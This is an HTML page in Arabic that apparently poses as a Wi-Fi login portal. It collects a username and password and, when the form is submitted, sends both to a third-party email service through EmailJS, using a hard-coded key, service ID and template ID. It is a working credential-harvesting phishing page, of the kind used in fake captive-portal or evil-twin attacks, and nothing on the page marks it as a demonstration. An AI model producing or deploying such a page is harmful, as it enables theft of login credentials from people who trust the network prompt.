<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل دخول Wi-Fi</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("gP_BeSd5bRueRL4rz"); // ضع الـ Public Key هنا
    })();

    function sendEmail(e) {
      e.preventDefault();
      emailjs.sendForm('service_329u6zc', 'template_38a0azd', e.target)
        .then(function() {
          alert('تم الإرسال بنجاح!');
        }, function(error) {
          alert('فشل الإرسال: ' + JSON.stringify(error));
        });
    }
  </script>
  <style>
    body {
      font-family: Arial;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
      width: 300px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <form onsubmit="sendEmail(event)">
    <h3>تسجيل دخول Wi-Fi</h3>
    <input type="text" name="username" placeholder="اسم المستخدم" required>
    <input type="password" name="password" placeholder="كلمة المرور" required>
    <button type="submit">دخول</button>
  </form>
</body>
</html>
